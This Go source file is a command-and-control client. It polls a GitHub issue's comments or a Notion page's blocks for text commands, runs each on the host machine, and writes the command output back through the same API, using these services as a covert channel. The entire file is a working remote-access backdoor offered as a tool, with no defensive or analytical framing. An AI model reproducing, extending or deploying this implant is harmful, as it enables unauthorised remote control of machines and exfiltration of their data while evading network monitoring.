package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	access_token string
	repo_name    string
	owner        string
	issuenumber  string
	output       []map[string]interface{}
	cmd          string
)

func github_logic(interval int) {
	if len(os.Args) < 5 {
		fmt.Println("Usage: client github <owner> <repo> <token> <issue_number> [interval]")
		return
	}
	owner = os.Args[2]
	repo_name = os.Args[3]
	access_token = os.Args[4]
	issuenumber = os.Args[5]
	var prev_command string

	client := &http.Client{}

	fmt.Println("[+] GitHub Client Started!")

	for {
		time.Sleep(time.Duration(interval) * time.Second)

		commentURI := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues/%s/comments", owner, repo_name, issuenumber)

		req, _ := http.NewRequest("GET", commentURI, nil)
		req.Header.Add("Authorization", "Bearer "+access_token)
		req.Header.Add("Accept", "application/vnd.github+json")

		response, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] Error in reading from GitHub: ", err)
			continue
		}

		body, _ := io.ReadAll(response.Body)
		response.Body.Close()

		var comments []map[string]interface{}
		if err := json.Unmarshal(body, &comments); err != nil {
			fmt.Println("[-] JSON Unmarshal error:", err)
			continue
		}

		if len(comments) == 0 {
			continue
		}

		lastComment, ok := comments[len(comments)-1]["body"].(string)
		if !ok {
			continue
		}

		if prev_command != lastComment {
			fmt.Println("[+] New command received:", lastComment)
			prev_command = lastComment

			tokens := strings.Fields(lastComment)
			if len(tokens) == 0 {
				continue
			}

			// Execute command
			result := exec.Command(tokens[0], tokens[1:]...)
			cmd_output, err := result.CombinedOutput()

			responseStr := string(cmd_output)
			if err != nil {
				responseStr = fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), responseStr)
			}

			// Write output back
			writeOutputToGithub(client, commentURI, responseStr)
			prev_command = responseStr
		}
	}
}

func writeOutputToGithub(client *http.Client, uri string, content string) {
	bodyMap := map[string]string{"body": content}
	jsonBody, _ := json.Marshal(bodyMap)

	req, _ := http.NewRequest("POST", uri, bytes.NewBuffer(jsonBody))
	req.Header.Add("Authorization", "Bearer "+access_token)
	req.Header.Add("Accept", "application/vnd.github+json")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] Error writing output to GitHub:", err)
		return
	}
	resp.Body.Close()
	fmt.Println("[+] Output sent to GitHub.")
}

type TextContent struct {
	Content string `json:"content"`
}

type RichText struct {
	Type string      `json:"type"`
	Text TextContent `json:"text"`
}

type Paragraph struct {
	RichText []RichText `json:"rich_text"`
}

type Block struct {
	Object    string    `json:"object"`
	Type      string    `json:"type"`
	Paragraph Paragraph `json:"paragraph"`
}

type Payload struct {
	Children []Block `json:"children"`
}

func notion_logic(interval int) {
	if len(os.Args) < 3 {
		fmt.Println("Usage: client notion <token> <page_id> [interval]")
		return
	}
	integration_token := os.Args[1]
	page_id := os.Args[2]

	var lastBlockID string
	url := "https://api.notion.com/v1/blocks/" + page_id + "/children"

	fmt.Println("[+] Notion C2 client started.")

	for {
		time.Sleep(time.Duration(interval) * time.Second)

		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Notion-Version", "2022-06-28")
		req.Header.Set("Authorization", "Bearer "+integration_token)

		res, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("[-] Error reading from Notion:", err)
			continue
		}

		body, _ := io.ReadAll(res.Body)
		res.Body.Close()

		var notionResp map[string]interface{}
		if err := json.Unmarshal(body, &notionResp); err != nil {
			continue
		}

		results, ok := notionResp["results"].([]interface{})
		if !ok || len(results) == 0 {
			continue
		}

		lastBlock := results[len(results)-1].(map[string]interface{})
		blockID, _ := lastBlock["id"].(string)

		if blockID == lastBlockID {
			continue
		}

		lastBlockID = blockID

		if lastBlock["type"] != "paragraph" {
			continue
		}

		para, ok := lastBlock["paragraph"].(map[string]interface{})
		if !ok {
			continue
		}
		rich, ok := para["rich_text"].([]interface{})
		if !ok || len(rich) == 0 {
			continue
		}

		// Safely extract text
		firstRich, ok := rich[0].(map[string]interface{})
		if !ok {
			continue
		}
		textData, ok := firstRich["text"].(map[string]interface{})
		if !ok {
			continue
		}
		commandText, ok := textData["content"].(string)
		if !ok {
			continue
		}

		fmt.Println("[+] Received command:", commandText)

		tokens := strings.Fields(commandText)
		if len(tokens) == 0 {
			continue
		}

		// Execute
		process := exec.Command(tokens[0], tokens[1:]...)
		output, cmdErr := process.CombinedOutput()

		responseContent := string(output)
		if cmdErr != nil {
			responseContent = fmt.Sprintf("Error: %s\n%s", cmdErr.Error(), responseContent)
		}

		// Notion has a 2000 char limit per block
		if len(responseContent) > 1950 {
			responseContent = responseContent[:1950] + "... [truncated]"
		}

		fmt.Println("[+] Executed. Sending output...")

		// Build response payload
		payloadStruct := Payload{
			Children: []Block{
				{
					Object: "block",
					Type:   "paragraph",
					Paragraph: Paragraph{
						RichText: []RichText{
							{
								Type: "text",
								Text: TextContent{
									Content: responseContent,
								},
							},
						},
					},
				},
			},
		}

		jsonPayload, _ := json.Marshal(payloadStruct)
		req2, _ := http.NewRequest("PATCH", url, bytes.NewBuffer(jsonPayload))
		req2.Header.Set("Notion-Version", "2022-06-28")
		req2.Header.Set("Authorization", "Bearer "+integration_token)
		req2.Header.Set("Content-Type", "application/json")

		res2, err := http.DefaultClient.Do(req2)
		if err != nil {
			fmt.Println("[-] Error writing to Notion:", err)
			continue
		}

		// Update our lastBlockID with the response ID so we don't process it as a command
		body2, _ := io.ReadAll(res2.Body)
		res2.Body.Close()
		var patchResp map[string]interface{}
		json.Unmarshal(body2, &patchResp)
		if patchResults, ok := patchResp["results"].([]interface{}); ok && len(patchResults) > 0 {
			lastBlockID, _ = patchResults[len(patchResults)-1].(map[string]interface{})["id"].(string)
			fmt.Println("[+] Output block ID:", lastBlockID)
		}
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: client <notion|github> [args...]")
		return
	}

	mode := os.Args[1]
	interval := 10
	if mode == "github" {
		if len(os.Args) >= 7 {
			fmt.Sscanf(os.Args[6], "%d", &interval)
		}
		github_logic(interval)
	} else if mode == "notion" {
		// Expecting: client notion <token> <page_id> [interval]
		if len(os.Args) >= 4 {
			if len(os.Args) >= 5 {
				fmt.Sscanf(os.Args[4], "%d", &interval)
			}
			os.Args = os.Args[1:] // Shift args so notion_logic sees them at 1 and 2
			notion_logic(interval)
		} else {
			fmt.Println("Usage: client notion <token> <page_id> [interval]")
		}
	} else {
		// Backward compatibility fallback for direct token/id
		notion_logic(interval)
	}
}
